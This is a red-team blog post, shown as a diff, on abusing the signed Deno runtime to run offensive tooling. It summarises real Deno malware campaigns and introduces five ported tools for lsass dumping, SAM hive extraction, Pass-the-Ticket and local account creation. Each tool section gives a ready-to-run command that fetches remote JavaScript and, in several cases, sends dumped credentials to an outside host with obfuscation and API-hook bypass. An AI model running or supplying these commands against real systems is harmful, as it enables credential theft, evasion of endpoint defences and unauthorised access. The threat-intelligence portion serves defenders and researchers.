@@ -1,0 +1,139 @@
+---
+layout: post
+title: Deno for Red Teaming - Offensive Tools Using the Deno Runtime
+categories: [Red Team, Malware Development]
+excerpt_separator: <!--more-->
+---
+
+Deno is a modern JavaScript runtime that is gaining traction among threat actors as a Bring Your Own Scripting Interpreter (BYOSI) tool. This post covers how Deno is being weaponized in the wild, why it is attractive for offensive operations, and introduces five Red Team tools I have ported to Deno: NativeDump, TrickDump, SAMDump, AutoPtT and AddUser-SAMR.
+
+<!--more-->
+
+
+<br>
+
+---
+
+## Background
+
+I started looking into Deno for offensive purposes after attending the talk [Signed, Trusted, Abused: Advanced BYOSI Malware Loader Techniques](https://www.youtube.com/watch?v=Y0Ch_CXEKrI) by Yuya Chudo and Ryunosuke Tsuruda at x33fcon 2026. The talk covered how legitimate, code-signed scripting runtimes can be abused as malware loaders, and Deno was one of the runtimes discussed. The concept is straightforward: instead of dropping a custom malware binary that will likely be flagged by endpoint protection, bring a legitimate signed interpreter and have it execute your payload. This is the BYOSI (Bring Your Own Scripting Interpreter) approach.
+
+After the conference I started researching the topic further and found that multiple threat intelligence vendors had already documented real-world campaigns abusing Deno. At the same time, I realized that Deno's Foreign Function Interface (FFI) makes it possible to call Windows API and NT API functions directly from JavaScript, opening the door to porting existing Red Team tools with minimal effort and zero external dependencies.
+
+<br>
+
+---
+
+## Deno in the Wild
+
+Several threat intelligence reports have documented active campaigns where threat actors leverage the Deno runtime. The common pattern across all of them is the same: deploy a legitimate, signed runtime on the target and use it to execute malicious scripts that would otherwise require a custom binary.
+
+[SonicWall researchers](https://www.sonicwall.com/blog/deno-runtime-exploited-the-emerging-threat-you-can-t-ignore) identified a campaign where an MSI installer drops a VBScript and PowerShell script that installs Deno from its official source. Once installed, a Base64-encoded JavaScript payload is decoded and executed through Deno, performing system fingerprinting, cryptocurrency wallet detection, antivirus enumeration, screenshot capture, keylogging and clipboard monitoring via C2 communication. Persistence is maintained through an AutoStart registry entry. Because security monitoring typically focuses on PowerShell and Node.js, the use of Deno allowed the malware to initially fly under the radar with minimal VirusTotal detections.
+
+In June 2026, [Sophos researchers](https://www.sophos.com/en-us/blog/clickfix-campaign-abuses-deno-runtime-for-infostealer-delivery) identified the ClickFix campaign, which compromised over 500 WordPress sites by injecting malicious JavaScript that displayed fake Cloudflare verification prompts. Victims were tricked into executing a PowerShell command that triggered an MSI installer, which used `winget.exe` to install Deno from legitimate sources. Deno then served as the primary orchestrator, retrieving and executing remote JavaScript payloads without requiring traditional malware loaders. Persistence was established through registry Run keys and scheduled tasks, and the final payload was a Python-based infostealer. The attack leveraged Deno's code-signed distribution to reduce security flagging and TryCloudflare infrastructure to mask C2 communications.
+
+[Atos researchers](https://atos.net/en/lp/cybershield/living-off-deno-dindoor-still-evolving) documented DinDoor, a multi-stage backdoor that uses Deno as its core execution environment. A trojanized MSI installer deploys CMD and PowerShell components to install the Deno runtime, then JavaScript-based launchers establish persistence and execute the final RAT payload entirely in memory, avoiding disk artifacts. The modular RAT supports browser credential theft, cryptocurrency wallet extraction, file exfiltration, remote desktop access and command execution through a centralized task dispatcher. At the time of publication (July 2026), 37 related MSI samples had been identified and the campaign remained active.
+
+
+<br>
+
+---
+
+## Why Deno for Red Teaming
+
+The common thread across all these campaigns is the BYOSI approach: instead of using a custom executable that will be analyzed and flagged, deploy a legitimate signed runtime and have it execute your payload. Deno is particularly attractive for this purpose:
+
+- **Signed and trusted binary**: Deno is a legitimate, code-signed executable that is unlikely to be flagged by endpoint protection solutions.
+
+- **FFI support**: Deno's Foreign Function Interface allows direct invocation of Windows API and NT API functions from JavaScript, enabling low-level operations such as memory manipulation, process interaction and direct system calls without any external dependency.
+
+- **Remote script execution**: Deno can fetch and execute scripts directly from a URL (`deno run https://...`), meaning the malicious JavaScript never needs to be written to disk.
+
+- **Network exfiltration**: Output data can be sent over the network directly from the script, so neither the script nor its output need to touch the filesystem.
+
+- **Zero dependencies**: Deno bundles its standard library, so no additional packages or modules need to be installed on the target system.
+
+- **Minimal forensic footprint**: The only artifact on disk is `deno.exe` itself, which is a legitimate application present in many development environments.
+
+
+<br>
+
+---
+
+## Ported Tools
+
+With this in mind, I ported five of my existing Red Team tools to Deno. All implementations use Deno's FFI to call Windows API functions directly from JavaScript, with zero external dependencies. All of them support remote execution from a URL, meaning the JavaScript source does not need to be on disk.
+
+
+<br>
+
+### NativeDump
+
+Repository: [https://github.com/ricardojoserf/NativeDump/tree/deno-flavour](https://github.com/ricardojoserf/NativeDump/tree/deno-flavour)
+
+NativeDump dumps the lsass process using only NT API functions, generating a Minidump file by hand-crafting it without calling `MiniDumpWriteDump`. The Deno implementation uses FFI to invoke these NT API functions directly from JavaScript. The key advantage is that **neither the JavaScript code nor the Minidump file need to touch disk**: the script is fetched remotely and the dump can be exfiltrated over the network. It also supports optional ntdll.dll overwriting (`disk`, `knowndlls` or `debugproc`) to bypass user-mode API hooks before performing the dump.
+
+```
+deno run --allow-ffi --allow-net https://raw.githubusercontent.com/ricardojoserf/NativeDump/deno-flavour/nativedump.js -o knowndlls -i 192.168.1.72 -p 1234
+```
+
+
+<br>
+
+### TrickDump
+
+Repository: [https://github.com/ricardojoserf/TrickDump/tree/deno-flavour](https://github.com/ricardojoserf/TrickDump/tree/deno-flavour)
+
+TrickDump takes a different approach: instead of generating a Minidump directly, it splits the process into three stages (`lock.js`, `shock.js` and `barrel.js`) that produce intermediate JSON files and compressed archives, which can be reconstructed offline into a valid Minidump using `create_dump.py`. Like NativeDump, **the JavaScript code and output data never need to touch disk**. The unified script `trick.js` consolidates all three stages:
+
+```
+deno run --allow-ffi --allow-net https://raw.githubusercontent.com/ricardojoserf/TrickDump/deno-flavour/trick.js -i 192.168.1.72 -P 1234
+```
+
+
+<br>
+
+### SAMDump
+
+Repository: [https://github.com/ricardojoserf/SAMDump/tree/main/Deno](https://github.com/ricardojoserf/SAMDump/tree/main/Deno)
+
+SAMDump extracts Windows SAM and SYSTEM files using Volume Shadow Copy Service (VSS), calling NT API and VSS COM interfaces directly via FFI. The same disk-free approach applies: the script is fetched remotely and the **SAM hives can be exfiltrated over the network without writing them to disk**, with optional XOR encoding for obfuscation. Requires Administrator privileges.
+
+```
+deno run --allow-ffi --allow-net https://raw.githubusercontent.com/ricardojoserf/SAMDump/main/Deno/samdump.js --send-remote --host 192.168.1.72 --port 1234 --xor-encode
+```
+
+
+<br>
+
+### AutoPtT
+
+Repository: [https://github.com/ricardojoserf/AutoPtT/tree/main/Deno](https://github.com/ricardojoserf/AutoPtT/tree/main/Deno)
+
+AutoPtT automates Pass-the-Ticket (PtT) attacks by enumerating Kerberos tickets and importing them into the current session, using FFI to interact with the Windows authentication APIs. It supports listing logon sessions and tickets, exporting TGTs and importing ticket files.
+
+```
+deno run --allow-ffi --allow-read --allow-write --allow-env https://raw.githubusercontent.com/ricardojoserf/AutoPtT/main/Deno/autoptt.js auto
+```
+
+
+<br>
+
+### AddUser-SAMR
+
+Repository: [https://github.com/ricardojoserf/AddUser-SAMR/tree/main/Deno](https://github.com/ricardojoserf/AddUser-SAMR/tree/main/Deno)
+
+AddUser-SAMR creates local user accounts using the SAMR API, the lowest-level RPC interface for managing the Windows local accounts database, calling SAMR functions from `samlib.dll` directly via FFI. Requires Administrator privileges.
+
+```
+deno run --allow-ffi https://raw.githubusercontent.com/ricardojoserf/AddUser-SAMR/main/Deno/adduser.js -u testuser -p MyPass123
+```
+
+
+<br>
+
+---
+
+## Conclusion
+
+Deno is becoming a relevant tool in the offensive security landscape, both for real-world threat actors and Red Team operators. Its FFI capabilities, combined with remote script execution and network exfiltration, make it possible to perform complex post-exploitation tasks where the only file on disk is the legitimate Deno binary. The five tools ported here demonstrate that credential dumping (lsass and SAM hives), Kerberos ticket manipulation and local account creation can all be performed through Deno with a minimal forensic footprint.
